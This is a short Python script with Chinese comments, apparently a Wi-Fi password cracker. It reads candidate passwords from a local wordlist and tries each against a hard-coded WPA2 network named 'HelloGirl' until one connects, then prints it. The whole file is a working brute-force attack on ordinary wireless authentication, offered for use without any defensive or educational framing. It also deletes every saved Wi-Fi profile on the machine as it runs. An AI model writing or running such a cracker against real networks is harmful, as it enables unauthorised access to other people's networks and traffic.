# coding:utf-8

import time
import pywifi
from pywifi import const
from asyncio.tasks import sleep

class Pojie():

    def __init__(self, path):
        self.file = open(path, 'r', errors="ignore")
        wifi = pywifi.PyWiFi() #抓取网卡接口
        self.iface = wifi.interfaces()[0]  #抓取第一个无限网卡
        self.iface.disconnect() #测试链接断开所有链接

        time.sleep(1)#休眠1秒

        # 测试网卡是否属于断开状态
        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]


    def readPassword(self):
        print("开始破解")

        while True:
            try:
                mystr = self.file.readline()
                if not mystr:
                    break
                success = self.test_connect(mystr)
                if success:
                    print("密码正确:", mystr)
                    break
                else:
                    print("密码错误:", mystr)
                sleep(3)
            except:
                continue

    def test_connect(self, findStr):
        profile = pywifi.Profile()
        profile.ssid = "HelloGirl"
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = findStr

        self.iface.remove_all_network_profiles()  # 删除所有的wifi文件
        tmp_profile = self.iface.add_network_profile(profile)  # 设定新的链接文件
        self.iface.connect(tmp_profile)  # 链接
        time.sleep(5)
        if self.iface.status() == const.IFACE_CONNECTED:  # 判断是否连接上
            isOK = True
        else:
            isOK = False
        self.iface.disconnect()  # 断开
        time.sleep(1)
        # 检查断开状态
        assert self.iface.status() in \
               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

        return isOK

    def __del__(self):
        self.file.close()

path = r"C:\Users\Administrator\Desktop\wifi.txt"
start = Pojie(path)
start.readPassword()






